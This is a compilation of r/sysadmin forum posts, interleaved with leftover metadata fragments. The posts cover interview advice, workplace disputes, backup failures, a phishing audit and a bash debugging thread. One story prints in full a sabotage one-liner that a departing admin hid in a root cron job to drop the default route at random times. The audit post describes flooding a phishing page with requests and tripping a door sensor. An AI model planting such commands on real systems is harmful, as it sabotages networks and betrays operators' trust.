* ""Ask me questions. Especially in response to an open-ended question/discussion. I want you to show me not just your knowledge but your thought process.""

* ""One I have to emphasise: Don't be afraid to not know everything. Most interviews I've been involved in (on either side) ask questions that the candidate isn't expected to know, to see how they handle themselves. ""I don't know off the top of my head, but know how/where to look it up if it becomes important"" is a great answer. BS, misdirection, and stalling are all BIG RED FLAGS."" ""I don't know, but I remember the man page for mdadm being pretty comprehensive""

* ""Try to be specific about where you expect to find the answer, especially when there are multiple sources available.""

* ""1) Avoid prolonged periods of silence. If you're thinking about a problem they've asked to you to solve, think out loud.""
* ""2) Somewhat applies to #1 as well. If you're asked about something you don't know, or don't know very well, be up front about that before you begin speculating. Or if you simply can't remember at the moment in the stress of the interview, say that and perhaps ask to move on and if you can come back to the question later.""

* ""No mouthing of about former employers.""

* ""Hey. I have a last minute pro tip if you want it. When I interview, I always always always sit with my two hands on my thighs. I sit straight up and lay my palms flat down on my pants. This does three things. 1) it gives you good posture 2) It keeps you from talking with your hands which makes you seem more confident and sure of yourself, and 3) The most important one imo, it soaks up all the sweat from your palms. This way when you shake the interviewers hand, your hand will be dry. It sucks to be in an interview and have to shake the hand of the person interviewing you with a palm full of sweat!""

* ""I'll add another - if you're lacking on hard core enterprise ready skills, but have a killer home network setup, I want to hear about it - don't be shy about telling us about it. That tells me you have drive. And if you have drive, we can find a place for you.""

* ""Also, a good go to response if they ask you why they should hire you over someone who might have a bit more experience or education: ""Have you ever heard the phrase 'hire the person, not the experience?'"". Basically explain that despite anyone's experience, the job can be done. So they should hire the person who is a good fit for the company on all levels. Explain how you're great with people and how you feel you have skills above and beyond what your resume could explain about you. I hope all of this helps! ""

* ""Good luck, stay cool, and remember to bring a pen and a copy of your resume just in case. Nice!""

* ""For entry level, self learning and quick learner is important.""

* ""As someone who does hiring of IT staff, I would ask you questions such as how do you deal with difficult clients, how do you deal with conflict within the team, explain to me your most challenging project, explain to me where you feel you saved the company money and how. ""

Below are more technical questions. These are questions I found here that either got asked about, or they asked themselves (sometimes interviewees post here) 

* ""They asked 2-3 easy questions all related to active directory. Where and how do you add/manage users and shit like that.""
* TCP/IP - 3 way handshake (what it stands for and a summary)
* TCP / UDP (the difference)
* AD/GPO
* OSI OSI OSI OSI 
* ""I don't even care what role you're in -- you should know at least what RAID 0, 1, 5 and 10 are.""
* ""How do you diagnose a hardware vs software vs user issue over the phone with no remote desktop access""
* ""What is a subnet mask""
* ""What's the difference between FAT32 and NTFS?"" 
* ""What is a SATA connector?""
* ""Can you describe DNS?""
* ""How a tcp connection is created and terminated""
* ""How many drives can fail in raid 0,1,5,6""

Here's some questions that just about anyone asks. 

* Describe a time when you had a disagreement with someone and how you resolved it
* How do you handle stress
* How do you handle a coworker who is difficult to work with
* Describe your 2 biggest strengths 
* Describe your 2 biggest weaknesses 

Hope this helps at least one person!

The data centre work I was doing last I mentioned somehow worked flawlessly without a hitch - needless to say, it's going to be used to pad my CV.

Four new unpaid ""interns"" have started, their job is to cold-call potential customers and badger them into meetings with our glorious sales team.

I had another meeting on Friday where I was told that ""the needs of the company outweigh everything else"" AKA ""You have to work seven days a week and no holidays for you"" Needless to say I've spent the weekend job hunting.

To try to guilt me into working the weekend my boss has given out my personal cell phone number to customers so they can phone me 24/7 to tell me when something goes wrong. For instance, yesterday I was meant to drive two hours to a customer site, install satellite broadband for them then drive for another hour to another client to do a server installation. All of this unpaid as it'd be a ""learning experience"" for me so that I can ""try to improve my mediocre skills"".

Finally, my boss has cleared out his office, all the company paperwork is gone and he's working from a laptop on the reception desk.

To counter this whirling storm of bullshit I called in sick today, turned the phone off, job hunted and am playing Skyrim with a bottle of Laphroaig.

Only had 73 new faults today, the company is running around shitting itself over the fact I'm not there. Oh well, back to Skyrim.

He says that someone claiming to be him used some throwaway email account to contact a female ex-employee and you can probably guess the tone of the chat conversations. The girl got suspicious after a few days/weeks and she called the boss at home. To add further drama his wife picked up and the girl told her everything. 

Needless to say the boss was not amused. He contacted a 'company detective' firm (not sure if that's the proper English term). I wasn't present at the meeting but the boss got convinced that someone currently in the company was responsible. Not someone specific, just 'someone'. 

The detective firm asked for the following and the boss gave his permission:

* all firewall logs as far back as I could go (told them I could go back 5+ years and surely that was too much, but no, they wanted it all)
* complete roaming profile folders of all 150+ users 
* complete home folders of all 150+ users
* all Exchange datastores incl. archive stores
* all PST files stored anywhere on the network (we don't use them anymore but a few still exist in the wild)
* all logs of our ISP (they even called our ISP themselves to ask this, who promptly told them to stuff it)
* all this should be gathered and handed over in absolute secrecy for everyone else in the company

Keep in mind there are no specific suspects and this is a 'just in case we find something' search. 

Meanwhile boss secretly had hidden cameras installed around the office and was connected to the camera webinterface almost 24x7 watching everything. I knew because they needed access to the serverroom and changes needed to be made to the firewall. 

My first instinct and reaction was 'hell no, you're not getting all that'. My reasoning was that this was a huge invasion of privacy for everyone and should not be handed over to some 3rd party to randomly search. If there'd been a specific suspect I would have been glad to help but this was just too much. 

Plus the secrecy, stories like this inevitably get out and then I would be the one who handed over 'their' stuff without telling them. These are people I've worked with for years and some I consider my friends. 

And let's face it, if you go around bothering an ex-employee to show her boobies on a webcam while claiming to be your boss you sure as hell don't use your corporate email-account and workstation/laptop. 

Boss told me it was his company, his servers, his logs and that I should hand it all over. I refused and informed the other managing partners of the company of the plans. They agreed with me and assured me they would talk to him. 

To add some form of closure: boss ignored other partners and informed our external IT-firm (my backup basically) to hand it all over and keep it quiet from me and everyone else within the company incl the other owners. I only found out because I caught them transferring fucktons of data. Again I told the other managing partners and even though they were majorly pissed off I guess they didn't want to get involved any more. 

As far as I know the detectives found nothing. Nobody got fired or reprimanded. The boss took a 6 month semi-forced vacation and he hasn't mentioned it since. 

There's more juicy details and theories to this story but I'll keep it 'short' for now. 

I'm no lawyer but this seems borderline illegal. At the very least abuse of power and invasion of privacy even though it's company servers/logs/etc. 

Don't get me wrong; I can understand that the boss was pissed off, who wouldn't be, but this was too much, wasn't it?

Morally and ethically I feel I did 'the right thing' and I can sleep at night at least. 

Thoughts?

UPDATE: I'm based in Europe where the employee seems to have a lot more rights regarding privacy. Didn't realize it was that different in the US. Hopefully that'll clear up some confusion and stop the more 'angry' replies from our US brethren. 

TLDR: Boss claims he's being blackmailed. Demands insane amount of logs, databases, profiles, etc be handed over to 3rd party. ",,False,self,t5_2qnp7,1361982535.0,,,True,t3_19bubl,http://www.reddit.com/r/sysadmin/comments/19bubl/on_ethics/,

Stay a while and listen! This is the story of our famed hero, who had his ass royally handed to him by bad backup policy.

So, rewind to 10AM on Wednesday. The trouble tickets start with a pretty simple symptom: our communicator only shows the local user. This happened before, and its fixed pretty quickly with a reboot of the server.

I logged into vSphere to go restart the guest VM, and discovered that the VM host isn't responding. The thing was, another guest on the machine was online, so I knew the host was functional. I went in to our Backup Exec instance, checked to make sure that we had a recent backup (we did) and manually restarted the server in the DC. 

I went off, got tea, came back, and the host still isn't responding to vSphere. Now it doesn't respond to ping, and I quickly discover that the HA on the machine wasn't configured properly. I walked back in to the DC, only to see *Grub Error 17* on the screen. Never have three words made me shit my pants so quickly.

A little bit of Googling tells me to need to use my VMWare disk to run the repair utility, and I'm back off to the races. I popped the disk in, ran the repair utility, rebooted the host, and all is well: the host comes back to life with the glorious little yellow screen.

I log back in to vSphere, reconnect the host and to my surprise *all of the VMs are gone on that host*. No matter, I'll just go in to the datastores, reconnect the .vmx files right? Well, no. The .vmx files reconnect just fine except for communicator. That's gone. In fact, it's entire datastore it was in is gone with it. I had to run another repair run just to get the datastore to register.

I jump back in to Backup Exec and tell it to restore communicator to the old ESX host. After a few feeble attempts, Backup Exec tells me to go stuff myself with various different errors: Logon account not valid! Lost communications with host! Cannot display hosts and drives! As it turns out, the backup procedure for this has never been tested and there is no guarantee that it will work. Due to other fires calling my name, I send out a remorseful email telling everyone to hang tight, and drive out for the night.

Fast forward to 3:45AM this morning, I jump in to Backup Exec's belly and rip out the vmdk file, figuring I can probably make an identical VM, connect the vmdk file to it, and boot the new VM to bring it back to life. As I boot the machine, my heart races, my chest pounds... and it laughs at me as it slowly dies saying that it cant mount the invalid SCSI drive. Shit.

Even after extensive googling, I'm left with nothing. All of the solutions want things I don't have: .vmx files that aren't there, flat-vmdk files that don't exist, descriptions of the host that I don't have. Every solution I come across needs me to have one more missing piece that isn't available to me. At this point I'm panicking, figuring that I'm going to have to rebuild communicator from the ground up, and I've got five hours to pull it off before start of business (and 3 hours short of missing my SLA deadlines).

I decide on a two prong strategy: fix Backup Exec and build a new communicator instance at the same time. If I can get Backup Exec to restore the machine, I'm golden. If not, then at least I'll be a few hours ahead in to the communicator install. After much fiddling and jigging, trying workaround after workaround, I finally get two miracles at once: I was blessed with a backup exec restore that is functional AND a faster-than-normal VM install. It's as if Hermes himself were running the packets through the copper wires, as the VM installs faster than I've ever seen and backup exec lays down the old data onto the VM host at rates we've never seen on the pipe.

6AM rolls by and the restore job in backup exec completes, communicator comes back online, and everything is honkey dorey.

Here's what I took away from this:

1. Test your backups regularly

My last role had me serving as a sole sysadmin for a small Cisco UC consulting firm in NYC. A great learning opportunity but there were issues.

Priorities were out of whack - Rerunning temporary network drops because they weren't ascetically pleasing was more important than setting up monitoring of core servers

Raises and hiring additional IT resources were promised for over 3 months while I continued to put in 70 hour work weeks. 

No comp time, continuous calls while on vacation or attending training for stupid things like expired passwords even though users get notified by email 14,7,3,2,1, day(s) before it expires with instructions on how to change it.

$9k below the average salary for a JUNIOR sysadmin in my market. They are STILL searching for a senior admin who's very proficient with MS and Cisco products offering only 90k (typically a 120k+ role here in NYC) while their Cisco Voice consultants start at 110k.

And many more. Ultimately I said fuck it. I took my $5k in the bank and submit my resignation. Spent 2 weeks not doing anything. Updated my resume and placed it on dice, careerbuilder, indeed, etc. Interviews came to me, I half heartingly looked myself. I spent most of my days sleeping until 2pm, wake up call back some recruiters. Over the course of the last two months I landed over 100 emails with requests to interview, 20+ phone interviews, 15+ in person interviews and 5 job offers. My resume isn't anything to be amazed with, my experience is fairly young still.

What I'm getting at is that if I can put almost 0 effort into finding work, anyone willing to actually put in effort should find even more quicker. This is of course dependable upon your market as well. I bought my time and got to be picky. If an interviewer called me late I didn't have to accept their apology, I could professionally inform them I'm no longer interested based on the fact that if I were to of called late it would be a black mark for me. I got to say no to some places, 2 said no to me.

As I got older I rationalized that I'd never be stupid enough to spend my money on something like Photoshop when free alternatives exist. But I continued using it, and keeping up with tutorials and new features (who can forget the ""Convert image to hat"" tool?) and I'd gotten very good at it. Don't get me wrong, I understand photography skills and photoshop skills are distinct entities, and I haven't touched the Lens Flare tool in 6 years.

But today I purchased it through my company. I was entrusted with making a purchasing decision on something I once thought I would never be able to afford. The ""photographer"" at work has been using Photoshop CS until today, mostly for things that could be done in paint, but after installing it on his computer, and then amazing him at my abilities by using things like quick mask and gradients to make selections, the company is now thinking of buying me a copy.

 I literally just found this in /r/sysadmin wiki: http://msadministrator.wordpress.com/category/mdt-2012/ 
This pretty much is exactly what I did. Just better. If you still are interested in deploying with MDT, please consult this blog. We didn´t find this during our developement and it would have saved us more than a couple of hours. If you have any questions left, just send me a PM. Sorry for upsetting anyone.

So, I am working for an IT-Service Company which serves SMBs as well as private customers. Anyone who works in this field knows: You gotta install Windows a lot! It has been my dream for quite a long time to have a stick or DVD to install any Windows version as well as that software package that we install on every PC. 

My collegue and I sat down and worked on a solution. We used Microsoft Deployment Toolkit and set up a stick that fulfilled my needs:

* Windows Setup for about 15 different versions (counting x86 and x64 twice, no Enterprise versions) 
* Automated silent installation of: Adobe Acrobat Reader, Adobe Flash, 7-zip, MSE, Java, CD Burner XP. You can choose which software you want to install, so this is no all-or-nothing-package. 
* Reading Win 8 OEM Keys from UEFI (was a big problem since MDT doesn´t support Win 8 very well and just inserted a wrong key)
* Executing a script to configure Windows to our standards (stuff like default folders, users, GPO)
* Connecting to our WSUS without domain support

We are pretty much finished, I just tested the latest version and it seemed to work like a charm. I boot from my stick, select my desired version, select the software, configure a couple of setting and hit run. That process takes about 2-3 minutes, depending on the hardware. I can walk away and do other important stuff like drinking coffee and when I return after 20-30 minutes (Gotta skip that Windows Key entry field for now, but we are working on skipping completely) its pretty much done. 

So why am I asking you and not just give a link? We are from Germany, so we gotta check if everything is localized properly. That takes a lot of time. Time that could be spend elsewhere. Not gonna lie: It could take a couple of days/weeks, since I have to get ready for my exam next month. Also we gotta clean it up, if we want to share it. Those embarassing scripts ... ;-) 



But I really want to share this project and maybe expand it, if anyone got the right idea. So if I got your interest, please tell me.

I still work with a lot of people like this.

I changed my tune a while back when somebody took a chance and invested in me - and promoted me to a management job.  
After that experience I decided I would take the attitude that I would simply do everything possible I could to further those people around me.  Since that point, I have tirelessly taught the people around me the scripting languages I know, pushed unhappy people to find other work, brought good people to places I worked, etc.  Now when my coworkers succeed, I feel like I win too, because I taught them something that they used to turn around a raise.  I keep a running tally of raises I've earned friends and coworkers like this - and the last 12 months is over $100,000 in annual salary boosts I've gotten people with a few phone calls and a little instruction.  I don't piss and moan about people who are barely able to do their job - I make it my goal to help those people as much as possible.  I don't try and fix my whole team at once - but I do find a couple receptive people and work with them. 

I would just like to recommend this very strongly as a career strategy in general.  The pay if forward approach has gotten me gigs I never imagined possible, and I'm owed so many favors now that I will never worry about finding work again.  Ours can be a very negative field, and companies often encourage competition between groups and engineers, whether they know it or not.  

tl:dr; if you can find a team that's trained, train the team you're with.  do favors for geeks, and they'll remember it.  because nobody ever does geeks a favor!",,False,self,t5_2qnp7,False,,,True,t3_qdu52,http://www.reddit.com/r/sysadmin/comments/qdu52/a_little_workplace_wisdom_ive_picked_up/,

Can they really do this?",192,34,96,http://www.reddit.com/r/sysadmin/comments/1bnjus/the_austrian_at_domain_registry_is_threatening_to/,"I registered a .at domain name using IWantMyName.com. I let it expire, then about a month later I get an invoice from nic.at for another year of domain registration.


I've never even been to the nic.at website so I'm thinking it's some type of scam or domain backordering service. Another week or two pass by and the number of emails from nic.at start increasing, each more threatening with mentions of debt collectors and legal action over the 30 Euro domain fee. So I do some investigating. 


Apparently all third-party austrian domain registrars have a tiny clause in their T&amp;C which basically states that in addition to their service, you are also entering into a perpetual contract with nic.at which can only be cancelled directly with nic.at. **To cancel you need to FAX(!)** a form through at least 28 days before your domain is set to expire.


I reluctantly pay the fee and try to cancel the domain. You can't cancel online, instead you need to fill out a form, print it, sign it, then fax it through. **This presents a glaring security hole**: Anyone can print off a cancellation form, fill it out with WHOIS details, sign it (they have nothing on file, nothing to compare the signature to), then fax it through and the domain is cancelled. [Try it yourself](http://www.nic.at/ui/index.php/kuendigung/?lang=en-iso-8859-15).


I asked them on the phone about this and they reasoned quote
&gt;""People can hack into your email, so doing it online is not necessarily any safer than via Fax. The signature is our policy, so you can take legal action if someone fakes your signature."" 

So I filled out the form and have tried to fax it through multiple times. Their fax machine keeps hanging up mid-transfer so I've been forced to scan the form and email it. I'm now waiting for a reply on whether or not my cancellation has been accepted. I honestly believe nic.at deliberately make it as difficult as possible to cancel your domain. I've caved in and paid them, but is it really legal for them to do this? Have any of you had experiences like this?

TLDR; No matter who you register a .at domain with, you need to cancel explicitly with nic.at. Also, in theory anyone can download a domain cancellation form, fill it out with your WHOIS details, and then fax it off to nic.at for cancellation.",,False,self,t5_2qnp7,False,,,True,t3_1bnjus,http://www.reddit.com/r/sysadmin/comments/1bnjus/the_austrian_at_domain_registry_is_threatening_to/,

You know what? The thing about system administration is **nobody knows everything about every single piece of software/hardware in existence.**

The reason why a lot of people got the position above you is because of various reasons. Here's a few to think about:

 * show leadership skills
 * have a knack for finding a solution to an issue quicker than other technicians
 * ability and drive to further their education/skill set to meet increasing needs of the environment
 * **understanding they don't know everything and the ability to work with others on the team to get an answer and learn from their experience**
 * strong understanding of a team environment and willing to work with the team to better it overall, this might include trying to explain to some guy who has been around for a while how to setup R&amp;RA, how to console an ASA who knows what. 
 * etc, etc

**Nobody can know everything and when you go around your superiors back to upper-management unless you have a case of gross negligence you're only hurting yourself.** 

Rather than try to work with YOUR TEAM to fix an issue you're causing dissemination as well as showing upper-management your unwillingness to work in a team. You're shooting yourself in the foot and might as well go back to geek squad because you obviously don't work well in a proper team-based environment.

Me? I'm a senior system administrator. I'm the end-line and deal with a lot of crazy issues on a regular basis. A lot I can handle in a quick manner, some I might have no experience in. I work with our team leaders, developers and sometimes maybe even a third party so we can figure out what happened and work a method to train myself and my employees how to better resolve these issues down the line. Can I be wrong? Absolutely. Have I been wrong? Absolutely. Does this mean I am not fit for my position? Nope.

Basically what I'm saying is stop being the know-it-all 20 year old and learn that everybody's human and unless you're seeing gross-negligence there is more-than-likely a reason your higher-up is doing something. If you don't understand the reasoning, ask them. I get questions all the time about things I do and talk with my technicians over the decision, why it's being implemented and am open to suggestions. The thing is I have been doing this for a long time so I have the experience with a lot of different implementations and know when something won't work, doesn't scale or is too expensive for someone. Money drives the world and while everyone would love to have a rack of blades attached to a rack of SANs that's not plausible, we work with what we got and what the upper people want. Don't be afraid to ask us questions, a good higher-up will gladly answer your questions and take suggestions but 99% of the time there's a very good reason we do what we do.",,False,self,t5_2qnp7,False,,,True,t3_kxkt2,http://www.reddit.com/r/sysadmin/comments/kxkt2/to_all_the_posters_in_here_that_are_being_that/,

Last week we had an internal State security audit.

One of their tests was to copy our login page and host it on their own server. They then sent an email to many on campus with a link asking them to verify some information, which started with the login page. Even though Outlook marked the email a potential phishing some people clicked the link and had their password captured. Sigh.

We all noticed that the address bar url was suspect. I was thinking I could put some obfusticated  java script in the login page and have it email my group in the event someone else tried this. The javascript would detect the incorrect address in the address bar. Is this feasible? Or is it too easily disabled?

One of my co-workers also caught the bogus login page, fired up jmeter and hit the bogus login page with 20,000 login attempts. That brought the bogus login web server down. Got to love DDOS. The auditors said that was unethical. Hehe.
 
Also, not login related, they also soaked some paper in hot water and slide it under a door. This triggered the inside infrared detector and unlocked the door from the inside, allowing access a computer room. There they found a laptop that was not locked and used the information on the laptop to social engineer password resets with help desk. Evil.

Know the enemy.

I was the PFY to his BOFH, and he taught me a lot.  Surprisingly, he was quite good to work for, BOFH notwithstanding.  He solved a lot of problems while I worked with him.

These are paraphrased from conversations and training 15+ years ago, but I still find these two principles useful in my daily professional life.

1.	Every time you have to work with a user to solve a problem, you use up a certain amount of goodwill.  User goodwill grows slowly day by day, as long as they do not have to talk to us or think about what they are doing.  When their work is interrupted, it costs goodwill.  If you have built up enough goodwill beforehand, you will weather the storm without a great deal of user drama or hysterics, and also without complaints filtering back from the user.  If not, well, shit happens.

2.	It does not matter if the setup was not our fault, if we didn’t have anything to do with it, or that unreasonable expectations were given by others…we make things happen.  Sometimes that means adjusting expectations, and sometimes it means thinking outside not just the box, but the cargo container carrying the box, and then outside the ship carrying the container somewhere into the calm waters of the South Pacific to find our solutions.  Either way, responsibility rests with us to know whether to do something and if so how to do it.  We must therefore be knowledgeable and professional at all times.

It dumps a bunch of commands into a script, executes the file to set environment variables, and in the process grabs output of the script to set the environment variables outside of the child process.

After correcting it by sourcing the script and dumping the extraneous garbage, it still won't execute via script execution, but if I run each command line by line, it works fine.  As a last ditch resort after 12 hours of work, I started typing, and ended up with this:

http://i.imgur.com/GAQjNfE.jpg

With a sick wife, I'm already on 2 hours of sleep.  Add a 12 hour work day, and I'm beat.  I took that autocomplete suggestion as a sign to go the hell home.

Edit: So, since you guys have been so willing to offer help, I figure it wouldn't hurt to see if anyone else can figure it out.  This is a reinstall script for SystemImager.  SysImager hasn't been updated since 2005, but the decision is above my head and I can't change that aspect.  It uses bash scripts in a very slimmed down PXEBoot environment (BOEL, if you're familiar with it).  Now, what's going on is we have internally developed console/power poles that can return the position of a server with execution of some really odd executable that hits an empty file in /tmp to do its business.  The executable then dumps 'setenv $pole=""&lt;position""' and other similar variables to the terminal.  Here's the terrible part.  'setenv' is a 1 liner that's set above to create a bash script that exports these variables.  Initially, there was a batch of ""read""s setup to capture the output of this executable, and looking at a working server, that seems to be what has worked (mostly) for the last 4-5 years or so.  Then, after 'read'ing the variables from the executable, it tries to execute the script it created to set the environment variables.  Due to process forking, that won't work, and as far as I can tell, never has.  On a working server, the variables set by 'read' seem to contain the data, but variables set by the 'setenv' -&gt; bash script don't.

I changed this to source the script instead of fork and execute, and it didn't fix it.  I changed it to echo the export line and eval the script, and that didn't work, either.  If this runs from within the script, variables can't get set.  However, if I run these commands manually, they work fine, variables get set, and the install can complete.

The issue is that 'read'ing the output from this executable seems to work for 90% of servers.  I've encountered this just a handful of times, and the server pools were so small I could work around it given the incredible lack of commentary in any of this code.  Now, the script isn't working on the first batch of 10, and no indication the other 50 won't have the same issue, so it's time to figure it out and fix rather than spend 8 hours clearing all 3600 external, 5500 internal ips from /etc/sysconfig post reinstall across 60 servers via console before I can get networking running correctly.

Edit edit: Here's some code:

    # Here's the setenv initialization, and the variable script initialization
    echo ""#!/bin/sh"" &gt; /bin/setenv
    echo ""#!/bin/sh"" &gt; /tmp/console_vars
    echo ""echo echo export \$1=\$2 &gt;&gt; /tmp/console_vars"" &gt;&gt; /bin/setenv
    chmod +x /bin/setenv

    #Internal executable that hits the empty file /tmp/foo and dumps `setenv` lines to the screen
    /scripts/cgetenv /tmp/foo

    #At this point, the console_vars file should have all the needed info.  I tried 
    #sourcing it before using . but now am trying to eval an echoe'd export.  If I run 
    #this command manually, variables get set.  Running in the script, they don't.
    chmod +x /tmp/console_vars
    eval ""$(/tmp/console_vars)""

    #I should have variables set at this point, but for some reason, they're not.
    

Edit Edit Edit:  Oh god.  I figured out the issue.  All those 'read's I didn't place in the above code skip past the output of cgetenv, and allow the commands output by the binary to be run.  When, for some reason or another, cgetenv throws extra whitespace lines, there's not enough read lines to compensate, so the rack position sits waiting for a terminal so it can execute rather than storing it to the file.  I think, rather than guessing whitespace, I'll use sed to filter it out.  My only issue is figuring out what's on those lines without any real tools like xxd, awk, or something to show me what exactly is happening here.  as /u/sdjason said, it's shit code, but I now understand why, if not the best idea the writer could have had.",,False,self,t5_2qnp7,1358905044.0,,,True,t3_171svl,http://www.reddit.com/r/sysadmin/comments/171svl/after_12_hours_of_work_google_decided_to_tell_me/,

They had trouble printing the file.  It would get to a certain page and then stop printing.  I got the file and tried to print it myself.  Sure enough at the same page it would hang there.  The printer would print to the previous page and then quit.  If you click on Word, it will crash it.  Turns out there was a graphic on the offending page that would cause the print job and Word to hang. Once I deleted the image and reprinted, it was fine, but still took 8 minutes to print a 38 page document.  

I remember attending a MS conference when Office 2007 was being announced and the lead speaker was boasting about the new container file format docx, xlsx, etc and their new *compression* methods to make the new file formats smaller than the previous generation.  *Compression*... kept ringing in my ears.

Here is the trick: 

Right click on the file and go to ""Open with..."" and navigate to WinRAR (have not tested with other archive/compression apps) and open the file.  You will be pleasantly surprised that you can now see the actual contents of the file.  For me there was a base XML file and 4 folders.  I drilled down into the folder that held the images...

There were 15 images all over 1MB each... One images was my company logo and name for the footer image &amp;#3232;\_&amp;#3232;

I found the offending image on that page, a 4MB EMF file.  Apparently when Word goes to print, it has to unpack, rasterize and do some magic to make it printable.  I extracted all the files out, resized them to normal sizes and saved them all as PNG files.  Copied them back and in and BAM!  8MB docx file down to 500kb.  Also, it prints under a minute.  

This technique is also good for extracting images from Power Point files as well as advanced Excel troubleshooting.

1344758526.0,143,self.sysadmin,y34ta,Thought I'd share this gem with you guys,200,57,114,http://www.reddit.com/r/sysadmin/comments/y34ta/thought_id_share_this_gem_with_you_guys/,"I'm a software developer in Brazil who's worked a number of companies over the last decade or so. Like so many others, my primary job has been directed at software maintenance, mainly debugging and fixing bugs on legacy code left behind by employees long gone. Until recently, I had never had a much closer contact with system adminsitrators. Teams I worked on usually just have their own environment configured locally and never had any real contact with a production server. Personally, I was never handed any passwords to production machines. God forbid, who knows what will happen if one of the Oompa Loompa developers got their hands on a root shell down at the 3rd floor! I am good guy, and I always thought this was too much paranoia... until I met Fabio.

When he started working with us, we quickly noticed he wasn't just your everyday Java programmer. He knew all sorts of tricks, scripts and command line shortcuts to make wonders in a Linux terminal. Some of his experience was in fact as a sysadmin, doing the same job as our 3rd flood guys. While 99% of us would be developing under Windows machines, he was the 1% that replaced Microsoft with Ubuntu. ""Gosh, Windows is horrible"", he kept saying!

And so he went on, maintaining, fixing bugs, implementing new features. Before the end of his first year, he was well known for his Linux expertise. Hell, even a couple of times we go to witness our senior administrator running upstairs to find him and get some ideas on how to resolve issues down at the server infrastructure. Without much effort or argument, he was easily handed remote shell access to the servers downstairs. It didn't take long until someone decided he should have root acess as well. I mean, the guy was a genius! What the hell was he doing up on this floor? It wasn't long until he was demanding his position to be changed. He wanted to be down there, rebooting and tunning up database servers for maximum performance. Eventually he got his wish. And that's when things quickly went downhill.

He was working downstairs, alright... but, God knows why, he felt he deserved a big fat raise. Management soon learned he wanted to top off our senior administrator and take his place. He was never confortable with how thing were done before he arrived. But can you blame him? Apache processes, cron jobs, applications servers and JVM, all running as root!

Things soon escalated to internal fights over security holes, higher salary and professional experience. It's interesting to see how some people change when denied power and influence. Even when they are right! Fabio soon met his end at that company. Once he realized he couldn't easily get to the top and change things, he quit and moved on to other oportunities.

But not without getting even. Ohh, no. He wanted to leave his mark behind so people wouldn't forget him. So, on his last day, he left the guys downstairs a little present. Over dozens of cron jobs running as root he picked an unsuspiscious bash script scheduled to run every 4 hours. One that did nothing much else than generate a report for an old project that no one had any interest today. He wiped the contents of the script and replaced it with this:

    echo route del default &gt; /var/log/xkdm.log &amp;&amp; at `rand -M 23`:`rand -M 59` -f /var/log/xkdm.log

Starting the next day, he never answered a single phone call from the desperate souls in the server room. Things just weren't working right, and they had absolutely no idea why. All processes were running OK. CPU and memory were free as birds. No bugs could be found by the dev team anywhere. And somehow, everything lost connectivity after random periods of time. Only in production servers?!?

At one point, our sysadmin resorted to ordering brand new network cards, different models from different brands, convinced they ones they had were dying for no apparent reason.

A full business week went on. Overtime expenses were through the rough, since they needed to keep an eye on servers 24/7, while others would create the ""never before existing"" backup procedure to migrate all data onto a newly installed server. And just before they were ready to format and reinstall all of it some one found the damn one liner script that was causing it all. One cautious coleague was scouring every file before including it to backup.

That was hallmark moment in my carrer. That's when I changed my view on why you should never allow root access to ANYONE other than your Chief System Administrator. Not every company I worked for does this, but the ones that don't are just waiting for people like Fabio to show up and screw them over by their asses. I wasn't directly involved into resolving the issue, but the ammount of stress generated got me seriously thinking about this. They learned this the hard way: Being paranoid is paramount for security. It was one hell of a week to watch, but at the end I guess Fabio got his message across pretty well. He just can't be expecting a letter of recommendation anytime soon.

Set up a Clearos server for a budget-conscious client 2 months ago. 

I have been back 4 times in two months, for about an hour each time - adding clients, setting up offsite rsync.  Tweaking openvpn - it's doing nat behind nat - long story - sharing dsl with another client so I had to mssfix/fragment tweak it for openvpn.  

Currently the client is very unhappy and apparently thinks I have been there too often and is complaining about how much time I have taken up.  They also tried to get me to lower my charge-out rate (95$ an hour).
 
They are new to the running their own business world and apparently think that when they bought a server that they bought something like a garbage can that would need no upkeep.  I am trying to figure out if they really feel this way or are just grilling me (they are both accountants) and trying to be cheap.  I have politely fired them so it doesn't really matter.

For future edification of clients and to avoid this problem in the future, does anyone know of some good, independent online sources for how much upkeep and maintenance should cost a business ?

(tl-dr) How much should businesses expect to pay for I.T. support per annum, per client or per server?  Maybe a linux/windows breakdown as well?

When asked why the server was dead and the accountants couldn't do any work, he told management that it was something that I did and they should go after me about it.

I have a virtualization server with 2 ""production"" VMs: a file server and another (ns1) for various network services and dev'ing environments. The latter broke hard after a system update and I eventually decided to rebuild it. To ensure I had the freshest backups of the two main volumes  of ns1, I quickly ran from the backup directory:

    # rsync -ax ns1:/home/ home/

and then for the / dir:

    # rsync -ax ns1:/ /

So a multiple mistakes and now have 2 servers to rebuild and an audit of my backup scripts, unless anyone knows a slick way of recovering files from system memory. It's going to be a fun Sunday!

* Ensure all OSs are being backed up. 
* If you must rsync into a remote with root perms, do as user:

Probably the worst was when I was working for web hosting company that had been huge in the late 90's due to the dotcom boom, but hadn't done well after and had slid down quite far from the glory days - for example, having a giant glassed-in office that you could fit 200+ people in, but only 30 people were left.  Needless to say, their systems were a huge mess and at least 7 years out of date with where everyone else in the industry was.

That's relevant because it showed how they treated their systems and their staff.  They decided they needed to lighten the load even more, and get rid of the rest of the IT team, myself included. 

I came into the office on Monday morning, and the IT Manager asked me to leave my laptop on my desk and go see the COO.  I said that's fine, I'll bring it with me and started *insisting* I leave it, which was very suspicious, but I did it, and went into the COO's office.

While I was in there being told I was a terrible admin and a ""bad fit"", the IT Manager had gone into my bag, pulled out the laptop, and copied all the contents to DVDs.  The only reason I know this is because after I came out (under escort) to get my bag, I found it open with the contents spilled out, and a few days later one of the devs told me they were trying to find incriminating evidence on the laptop to try and blackmail me into not suing them.  

They made the process as humiliating as possible.  They've since gone under and the job I got after was 10x better.

After many months I managed to land a gig doing tech support for a mid-sized company. They separated tech support and infrastructure IT, though one of the tech support guys had managed to work his way into the infra IT group. This infra IT man hounded me from the week I started, and constantly invented ways to attack and undermine me as a professional. One of my coworkers actually filed a formal complaint with HR about the harassment, which went nowhere. I left the company as quickly as I could, and apparently that man left within a year of my egress.

Today: His resume hits my manager's desk, applying for all of the positions we have open. One is intern-level and another is 10yr+ level, with some inbetween.

Here's how I spent my Saturday...,166,25,53,http://www.reddit.com/r/sysadmin/comments/zz17x/does_your_boss_need_some_convincing_that_proper/,"As a 60-strong software house, we host quite a lot of kit in our office to support our developers. I was in on Saturday, as is sometimes the case, doing some out-of-hours network upgrades. As I'm working at the back of the cabinets, I lean back against the wall for a second, and feel my back getting wet. I look up to find water is dripping from the ceiling. It isn't dripping on any equipment yet, but this is obviously not good. Soon more drips start to appear on other areas of the floor. I speak to the building security, who investigates. Turns out our upstairs neighbours have a leaking vending machine. It's been leaking for a while, because half of their floor is flooded.

